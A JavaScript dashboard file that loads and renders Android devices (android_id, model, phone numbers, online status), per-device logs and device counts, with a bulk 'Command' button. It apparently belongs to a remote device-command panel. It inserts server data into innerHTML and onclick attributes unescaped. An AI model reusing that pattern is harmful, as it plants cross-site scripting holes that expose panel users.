const DevicesManager = {
    selectedDevices: [],
    
    async load() {
        const perPage = 20;
        const page = 1;
        const searchInput = document.getElementById('deviceSearch');
        const search = searchInput ? searchInput.value : '';
        
        try {
            const data = await API.getDevices(page, perPage, search);
            const tbody = document.getElementById('devicesTableBody');
            if (!tbody) return;
            tbody.innerHTML = '';
            
            if (!data.devices || data.devices.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:2rem; color:var(--text-muted)">No devices found</td></tr>';
                return;
            }

            data.devices.forEach(dev => {
                const tr = document.createElement('tr');
                tr.style.borderBottom = '1px solid var(--border)';
                
                // Status calculation (online if seen in last 2 mins)
                const isOnline = dev.online && (new Date() - new Date(dev.online) < 120000);
                
                tr.innerHTML = `
                    <td style="padding:1rem"><input type="checkbox" class="device-checkbox" value="${dev.android_id}" onchange="DevicesManager.updateSelection()"></td>
                    <td><code style="color:var(--primary); font-weight:700">${dev.android_id}</code></td>
                    <td style="font-weight:500">${dev.model || 'Unknown Device'}</td>
                    <td style="color:var(--text-muted)">${dev.phone_numbers || '-'}</td>
                    <td><span class="${isOnline ? 'status-online' : 'status-offline'}">${isOnline ? '● Online' : '● Offline'}</span></td>
                    <td><button onclick="showCommandModal('${dev.android_id}')" class="btn-primary" style="padding:0.35rem 0.75rem; font-size:0.75rem;">Command</button></td>
                `;
                tbody.appendChild(tr);
            });
        } catch (err) {
            console.error('Error loading devices:', err);
        }
    },

    updateSelection() {
        const checkboxes = document.querySelectorAll('.device-checkbox:checked');
        this.selectedDevices = Array.from(checkboxes).map(cb => cb.value);
        const sendBtn = document.getElementById('sendCommandBtn');
        if (sendBtn) sendBtn.disabled = this.selectedDevices.length === 0;
    },

    selectAll() {
        document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = true);
        this.updateSelection();
    },

    toggleSelectAll() {
        const master = document.getElementById('selectAllCheckbox');
        if (!master) return;
        document.querySelectorAll('.device-checkbox').forEach(cb => cb.checked = master.checked);
        this.updateSelection();
    },

    getSelectedDevices() {
        return this.selectedDevices;
    },

    filter() {
        this.load();
    }
};

const LogsManager = {
    async load() {
        const searchInput = document.getElementById('logSearch');
        const search = searchInput ? searchInput.value : '';
        try {
            const data = await API.getLogs(search);
            const tbody = document.getElementById('logsTableBody');
            if (!tbody) return;
            tbody.innerHTML = '';
            
            if (!data.logs || data.logs.length === 0) {
                tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:2rem; color:var(--text-muted)">No logs found</td></tr>';
                return;
            }

            data.logs.forEach(log => {
                const tr = document.createElement('tr');
                tr.style.borderBottom = '1px solid var(--border)';
                tr.innerHTML = `
                    <td style="padding:1rem; color:var(--text-muted); width:150px"><code>${log.android_id}</code></td>
                    <td style="padding:1rem">${log.log}</td>
                    <td style="padding:1rem; font-size:0.8rem; color:var(--text-muted); width:180px">${log.created_at}</td>
                `;
                tbody.appendChild(tr);
            });
        } catch (err) {
            console.error('Error loading logs:', err);
        }
    },
    filter() { this.load(); }
};

const DeviceCountManager = {
    async update() {
        try {
            const data = await API.getDeviceCount();
            const total = document.getElementById('deviceCount');
            const online = document.getElementById('onlineCount');
            const offline = document.getElementById('offlineCount');
            if (total) total.textContent = data.total;
            if (online) online.textContent = data.online;
            if (offline) offline.textContent = data.offline;
        } catch (err) {
            console.error('Error updating stats:', err);
        }
    }
};
